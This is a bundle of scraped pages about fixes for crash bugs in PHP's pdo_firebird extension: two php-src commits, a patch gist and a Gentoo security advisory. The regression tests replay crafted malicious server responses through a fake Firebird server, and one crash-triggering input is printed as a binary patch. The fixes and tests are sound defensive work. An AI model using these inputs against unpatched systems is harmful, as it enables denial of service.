[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/286162e9b03071c4308e7e92597bca4239f49d89)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix #76452: Crash while parsing blob data in firebird\_fetch\_blob

[Browse files](/php/php-src/tree/286162e9b03071c4308e7e92597bca4239f49d89)
Browse the repository at this point in the history

```
We need to prevent integer overflow when calling `erealloc()` with
`len+1`.
```

* Loading branch information

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[cmb69](/php/php-src/commits?author=cmb69 "View all commits by cmb69")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Jun 21, 2021

1 parent
[a5538c6](/php/php-src/commit/a5538c62293fa782fcc382d0635cfc0c8b9190e3)

commit 286162e

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**36 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ext/pdo\_firebird

  + ext/pdo\_firebird/firebird\_statement.c
    [firebird\_statement.c](#diff-90d42f012b3b598293c8240b76f60414b7fb9be40e033884d002d27010968de7)
  + tests

    - ext/pdo\_firebird/tests/bug\_76452.data
      [bug\_76452.data](#diff-6d8aa85ac44aee35b6dffea06028d05bd6e551d790e753ff69d32b9b998d852a)
    - ext/pdo\_firebird/tests/bug\_76452.phpt
      [bug\_76452.phpt](#diff-edb80128f5067dec9b35ac50e152b072d2e53c065caedd386624aff08640ef68)

## There are no files selected for viewing

5 changes: 5 additions & 0 deletions

5
[ext/pdo\_firebird/firebird\_statement.c](#diff-90d42f012b3b598293c8240b76f60414b7fb9be40e033884d002d27010968de7 "ext/pdo_firebird/firebird_statement.c")

Show comments

[View file](/php/php-src/blob/286162e9b03071c4308e7e92597bca4239f49d89/ext/pdo_firebird/firebird_statement.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -299,6 +299,11 @@ static int firebird\_fetch\_blob(pdo\_stmt\_t \*stmt, int colno, char \*\*ptr, /\* {{{ \* |
|  |  | unsigned short seg\_len; |
|  |  | ISC\_STATUS stat; |
|  |  |  |
|  |  | /\* prevent overflow \*/ |
|  |  | if (\*len == ZEND\_ULONG\_MAX) { |
|  |  | result = 0; |
|  |  | goto fetch\_blob\_end; |
|  |  | } |
|  |  | \*ptr = S->fetch\_buf[colno] = erealloc(S->fetch\_buf[colno], \*len+1); |
|  |  |  |
|  |  | for (cur\_len = stat = 0; (!stat || stat == isc\_segment) && cur\_len < \*len; cur\_len += seg\_len) { |
| Expand Down | |  |

Binary file added
BIN
+856 Bytes

[ext/pdo\_firebird/tests/bug\_76452.data](#diff-6d8aa85ac44aee35b6dffea06028d05bd6e551d790e753ff69d32b9b998d852a "ext/pdo_firebird/tests/bug_76452.data")

Show comments

[View file](/php/php-src/blob/286162e9b03071c4308e7e92597bca4239f49d89/ext/pdo_firebird/tests/bug_76452.data)
Edit file

Delete file

Binary file not shown.

31 changes: 31 additions & 0 deletions

31
[ext/pdo\_firebird/tests/bug\_76452.phpt](#diff-edb80128f5067dec9b35ac50e152b072d2e53c065caedd386624aff08640ef68 "ext/pdo_firebird/tests/bug_76452.phpt")

Show comments

[View file](/php/php-src/blob/286162e9b03071c4308e7e92597bca4239f49d89/ext/pdo_firebird/tests/bug_76452.phpt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,31 @@ |
|  |  | --TEST-- |
|  |  | Bug ##76452 (Crash while parsing blob data in firebird\_fetch\_blob) |
|  |  | --SKIPIF-- |
|  |  | <?php require('skipif.inc'); ?> |
|  |  | --FILE-- |
|  |  | <?php |
|  |  | require\_once "payload\_server.inc"; |
|  |  |  |
|  |  | $address = run\_server(\_\_DIR\_\_ . "/bug\_76452.data"); |
|  |  |  |
|  |  | // no need to change the credentials; we're running against a falke server |
|  |  | $dsn = "firebird:dbname=inet://$address/test"; |
|  |  | $username = 'SYSDBA'; |
|  |  | $password = 'masterkey'; |
|  |  |  |
|  |  | $dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  |  | $query = $dbh->prepare("select \* from test"); |
|  |  | $query->execute(); |
|  |  | var\_dump($query->fetch()); |
|  |  | ?> |
|  |  | --EXPECT-- |
|  |  | array(4) { |
|  |  | ["AAA"]=> |
|  |  | string(4) "hihi" |
|  |  | [0]=> |
|  |  | string(4) "hihi" |
|  |  | ["BBBB"]=> |
|  |  | NULL |
|  |  | [1]=> |
|  |  | NULL |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `286162e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F286162e9b03071c4308e7e92597bca4239f49d89) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7233abff_20250115_133633.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fbcbf8aa0c96d8d9e81ec3428232485555fae0b37)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fbcbf8aa0c96d8d9e81ec3428232485555fae0b37)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/bcbf8aa0c96d8d9e81ec3428232485555fae0b37)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix #76450: SIGSEGV in firebird\_stmt\_execute

[Browse files](/php/php-src/tree/bcbf8aa0c96d8d9e81ec3428232485555fae0b37)
Browse the repository at this point in the history

```
We need to verify that the `result_size` is not larger than our buffer,
and also should make sure that the `len` which is passed to
`isc_vax_integer()` has a permissible value; otherwise we bail out.
```

* Loading branch information

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[cmb69](/php/php-src/commits?author=cmb69 "View all commits by cmb69")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Jun 21, 2021

1 parent
[286162e](/php/php-src/commit/286162e9b03071c4308e7e92597bca4239f49d89)

commit bcbf8aa

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**36 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ext/pdo\_firebird

  + ext/pdo\_firebird/firebird\_statement.c
    [firebird\_statement.c](#diff-90d42f012b3b598293c8240b76f60414b7fb9be40e033884d002d27010968de7)
  + tests

    - ext/pdo\_firebird/tests/bug\_76450.data
      [bug\_76450.data](#diff-b012f65c1e8479c1de6f95b97a3638e920352c5ad28a4d8e40335fe843b1413e)
    - ext/pdo\_firebird/tests/bug\_76450.phpt
      [bug\_76450.phpt](#diff-2c167205ee8c0d16826621c5a822281056b0e16a773d7cc27afc018e4a2c9bff)

## There are no files selected for viewing

7 changes: 7 additions & 0 deletions

7
[ext/pdo\_firebird/firebird\_statement.c](#diff-90d42f012b3b598293c8240b76f60414b7fb9be40e033884d002d27010968de7 "ext/pdo_firebird/firebird_statement.c")

Show comments

[View file](/php/php-src/blob/bcbf8aa0c96d8d9e81ec3428232485555fae0b37/ext/pdo_firebird/firebird_statement.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -133,8 +133,14 @@ static int firebird\_stmt\_execute(pdo\_stmt\_t \*stmt) /\* {{{ \*/ |
|  |  | } |
|  |  | if (result[0] == isc\_info\_sql\_records) { |
|  |  | unsigned i = 3, result\_size = isc\_vax\_integer(&result[1], 2); |
|  |  | if (result\_size > sizeof(result)) { |
|  |  | goto error; |
|  |  | } |
|  |  | while (result[i] != isc\_info\_end && i < result\_size) { |
|  |  | short len = (short) isc\_vax\_integer(&result[i + 1], 2); |
|  |  | if (len != 1 && len != 2 && len != 4) { |
|  |  | goto error; |
|  |  | } |
|  |  | if (result[i] != isc\_info\_req\_select\_count) { |
|  |  | affected\_rows += isc\_vax\_integer(&result[i + 3], len); |
|  |  | } |
| Expand All | | @@ -158,6 +164,7 @@ static int firebird\_stmt\_execute(pdo\_stmt\_t \*stmt) /\* {{{ \*/ |
|  |  | return 1; |
|  |  | } while (0); |
|  |  |  |
|  |  | error: |
|  |  | RECORD\_ERROR(stmt); |
|  |  |  |
|  |  | return 0; |
| Expand Down | |  |

Binary file added
BIN
+464 Bytes

[ext/pdo\_firebird/tests/bug\_76450.data](#diff-b012f65c1e8479c1de6f95b97a3638e920352c5ad28a4d8e40335fe843b1413e "ext/pdo_firebird/tests/bug_76450.data")

Show comments

[View file](/php/php-src/blob/bcbf8aa0c96d8d9e81ec3428232485555fae0b37/ext/pdo_firebird/tests/bug_76450.data)
Edit file

Delete file

Binary file not shown.

29 changes: 29 additions & 0 deletions

29
[ext/pdo\_firebird/tests/bug\_76450.phpt](#diff-2c167205ee8c0d16826621c5a822281056b0e16a773d7cc27afc018e4a2c9bff "ext/pdo_firebird/tests/bug_76450.phpt")

Show comments

[View file](/php/php-src/blob/bcbf8aa0c96d8d9e81ec3428232485555fae0b37/ext/pdo_firebird/tests/bug_76450.phpt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,29 @@ |
|  |  | --TEST-- |
|  |  | Bug #76450 (SIGSEGV in firebird\_stmt\_execute) |
|  |  | --SKIPIF-- |
|  |  | <?php |
|  |  | if (!extension\_loaded('pdo\_firebird')) die("skip pdo\_firebird extension not available"); |
|  |  | if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  |  | ?> |
|  |  | --FILE-- |
|  |  | <?php |
|  |  | require\_once "payload\_server.inc"; |
|  |  |  |
|  |  | $address = run\_server(\_\_DIR\_\_ . "/bug\_76450.data"); |
|  |  |  |
|  |  | // no need to change the credentials; we're running against a fake server |
|  |  | $dsn = "firebird:dbname=inet://$address/test"; |
|  |  | $username = 'SYSDBA'; |
|  |  | $password = 'masterkey'; |
|  |  |  |
|  |  | $dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  |  | $sql = "EXECUTE PROCEDURE test\_proc 123"; |
|  |  | $query = $dbh->prepare($sql); |
|  |  | try { |
|  |  | $query->execute(); |
|  |  | } catch (Exception $ex) { |
|  |  | echo "{$ex->getMessage()}\n"; |
|  |  | } |
|  |  | ?> |
|  |  | --EXPECT-- |
|  |  | SQLSTATE[HY000]: General error |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `bcbf8aa`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fbcbf8aa0c96d8d9e81ec3428232485555fae0b37) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.gentoo.org_4cef4ca4_20250115_090359.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# PHP: Multiple Vulnerabilities — GLSA **202209-20**

Multiple vulnerabilities have been discovered in PHP, the worst of which could result in local root privilege escalation.

### Affected packages

| Package | **dev-lang/php** on all architectures |
| --- | --- |
| Affected versions | < **7.4.30**< **8.0.23**< **8.1.8** |
| Unaffected versions | >= **7.4.30**>= **8.0.23**>= **8.1.8** |

### Background

PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTML.

### Description

Multiple vulnerabilities have been discovered in PHP. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All PHP 7.4 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-7.4.30:7.4"

```

All PHP 8.0 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-8.0.23:8.0"

```

All PHP 8.1 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/php-8.1.8:8.1"

```
### References

* [CVE-2021-21703](https://nvd.nist.gov/vuln/detail/CVE-2021-21703)
* [CVE-2021-21704](https://nvd.nist.gov/vuln/detail/CVE-2021-21704)
* [CVE-2021-21705](https://nvd.nist.gov/vuln/detail/CVE-2021-21705)
* [CVE-2021-21708](https://nvd.nist.gov/vuln/detail/CVE-2021-21708)
* [CVE-2022-31625](https://nvd.nist.gov/vuln/detail/CVE-2022-31625)
* [CVE-2022-31626](https://nvd.nist.gov/vuln/detail/CVE-2022-31626)
* [CVE-2022-31627](https://nvd.nist.gov/vuln/detail/CVE-2022-31627)

**Release date**

September 29, 2022

**Latest revision**

September 29, 2022: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [799776](https://bugs.gentoo.org/show_bug.cgi?id=799776)
* [810526](https://bugs.gentoo.org/show_bug.cgi?id=810526)
* [819510](https://bugs.gentoo.org/show_bug.cgi?id=819510)
* [833585](https://bugs.gentoo.org/show_bug.cgi?id=833585)
* [850772](https://bugs.gentoo.org/show_bug.cgi?id=850772)
* [857054](https://bugs.gentoo.org/show_bug.cgi?id=857054)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from gist.github.com_4181f048_20250115_133635.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=64&v=4)](/cmb69)

# [cmb69](/cmb69)/**[0001-Fix-76449-SIGSEGV-in-firebird\_handle\_doer.patch](/cmb69/344574cbdbfa305a329c0e18a752d31d)** Secret

Created
May 5, 2021 12:14

Show Gist options

* [Download ZIP](/cmb69/344574cbdbfa305a329c0e18a752d31d/archive/da3131590c41241210f52f57bd6e9bf333f0ce11.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/344574cbdbfa305a329c0e18a752d31d.js&quot;&gt;&lt;/script&gt;
* Save cmb69/344574cbdbfa305a329c0e18a752d31d to your computer and use it in GitHub Desktop.

[Code](/cmb69/344574cbdbfa305a329c0e18a752d31d)
[Revisions
1](/cmb69/344574cbdbfa305a329c0e18a752d31d/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/344574cbdbfa305a329c0e18a752d31d.js&quot;&gt;&lt;/script&gt;

Save cmb69/344574cbdbfa305a329c0e18a752d31d to your computer and use it in GitHub Desktop.

[Download ZIP](/cmb69/344574cbdbfa305a329c0e18a752d31d/archive/da3131590c41241210f52f57bd6e9bf333f0ce11.zip)

Fix for PHP bug #76449

 [Raw](/cmb69/344574cbdbfa305a329c0e18a752d31d/raw/da3131590c41241210f52f57bd6e9bf333f0ce11/0001-Fix-76449-SIGSEGV-in-firebird_handle_doer.patch)

[**0001-Fix-76449-SIGSEGV-in-firebird\_handle\_doer.patch**](#file-0001-fix-76449-sigsegv-in-firebird_handle_doer-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 98a871fe43525bca3eb961da9762a36d2ca5162d Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: "Christoph M. Becker" <cmbecker69@gmx.de> |
|  | Date: Fri, 30 Apr 2021 13:53:21 +0200 |
|  | Subject: [PATCH] Fix #76449: SIGSEGV in firebird\_handle\_doer |
|  |  |
|  | We need to verify that the `result\_size` is not larger than our buffer, |
|  | and also should make sure that the `len` which is passed to |
|  | `isc\_vax\_integer()` has a permissible value; otherwise we bail out. |
|  | --- |
|  | ext/pdo\_firebird/firebird\_driver.c | 9 +++++++++ |
|  | ext/pdo\_firebird/tests/bug\_76449.data | Bin 0 -> 464 bytes |
|  | ext/pdo\_firebird/tests/bug\_76449.phpt | 23 +++++++++++++++++++++++ |
|  | 3 files changed, 32 insertions(+) |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76449.data |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76449.phpt |
|  |  |
|  | diff --git a/ext/pdo\_firebird/firebird\_driver.c b/ext/pdo\_firebird/firebird\_driver.c |
|  | index b1869f2695..4af75a5e34 100644 |
|  | --- a/ext/pdo\_firebird/firebird\_driver.c |
|  | +++ b/ext/pdo\_firebird/firebird\_driver.c |
|  | @@ -206,8 +206,17 @@ static zend\_long firebird\_handle\_doer(pdo\_dbh\_t \*dbh, const char \*sql, size\_t sq |
|  | if (result[0] == isc\_info\_sql\_records) { |
|  | unsigned i = 3, result\_size = isc\_vax\_integer(&result[1],2); |
|  |  |
|  | + if (result\_size > sizeof(result)) { |
|  | + ret = -1; |
|  | + goto free\_statement; |
|  | + } |
|  | while (result[i] != isc\_info\_end && i < result\_size) { |
|  | short len = (short)isc\_vax\_integer(&result[i+1],2); |
|  | + /\* bail out on bad len \*/ |
|  | + if (len != 1 && len != 2 && len != 4) { |
|  | + ret = -1; |
|  | + goto free\_statement; |
|  | + } |
|  | if (result[i] != isc\_info\_req\_select\_count) { |
|  | ret += isc\_vax\_integer(&result[i+3],len); |
|  | } |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76449.data b/ext/pdo\_firebird/tests/bug\_76449.data |
|  | new file mode 100644 |
|  | index 0000000000000000000000000000000000000000..bac82d337a08568d76a0fc1ec43eb76d04447153 |
|  | GIT binary patch |
|  | literal 464 |
|  | zcmZQzV2Jzwzk#2Dfq@Z-S%DY?xP4O76O$|B9ZO3xAR-Vl2Fk%D&xx!U$\_AMW10Z>1 |
|  | zK1dvy50YmB2\_gY>c\_b+Yc~KUydT9v7%FY6oWr5OQt?2rZ`5@KEe02L2#sB~3|My=2 |
|  | os7wH2G%tkWV\*%@9f@(%L1MCVU0!98m5Fp8cm?-jSawN$E08bGWUH||9 |
|  |  |
|  | literal 0 |
|  | HcmV?d00001 |
|  |  |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76449.phpt b/ext/pdo\_firebird/tests/bug\_76449.phpt |
|  | new file mode 100644 |
|  | index 0000000000..48a09c1d4e |
|  | --- /dev/null |
|  | +++ b/ext/pdo\_firebird/tests/bug\_76449.phpt |
|  | @@ -0,0 +1,23 @@ |
|  | +--TEST-- |
|  | +Bug #76449 (SIGSEGV in firebird\_handle\_doer) |
|  | +--SKIPIF-- |
|  | +<?php |
|  | +if (!extension\_loaded('pdo\_firebird')) die("skip pdo\_firebird extension not available"); |
|  | +if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  | +?> |
|  | +--FILE-- |
|  | +<?php |
|  | +require\_once "payload\_server.inc"; |
|  | + |
|  | +$address = run\_server(\_\_DIR\_\_ . "/bug\_76449.data"); |
|  | + |
|  | +// no need to change the credentials; we're running against a fake server |
|  | +$dsn = "firebird:dbname=inet://$address/test"; |
|  | +$username = 'SYSDBA'; |
|  | +$password = 'masterkey'; |
|  | + |
|  | +$dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  | +var\_dump($dbh->exec("INSERT INTO test VALUES ('hihi2', 'xxxxx')")); |
|  | +?> |
|  | +--EXPECT-- |
|  | +bool(false) |
|  | -- |
|  | 2.31.1.windows.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F344574cbdbfa305a329c0e18a752d31d)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7ef4e215_20250115_133640.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFirebirdSQL%2Ffirebird%2Fblob%2Fmaster%2Fsrc%2Fremote%2Fremote.cpp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
